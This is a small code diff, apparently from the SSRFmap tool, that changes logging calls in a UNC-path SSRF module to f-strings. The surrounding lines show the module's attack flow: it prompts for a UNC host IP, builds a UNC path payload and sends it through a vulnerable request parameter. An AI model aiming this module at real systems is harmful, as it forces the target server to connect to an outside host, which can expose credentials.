@@ -15,7 +15,7 @@ class exploit():
     UNC_FILE    = "SSRFmap"
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
 
         UNC_IP   = input("UNC IP (default: 192.168.1.2): ")
         if UNC_IP != '':
@@ -27,4 +27,4 @@ class exploit():
         
         payload = wrapper_unc(self.UNC_FILE, self.UNC_IP)
         r = requester.do_request(args.param, payload)
-        logging.info("\033[32mSending UNC Path\033[0m : {}".format(payload))
+        logging.info(f"\033[32mSending UNC Path\033[0m : {payload}")
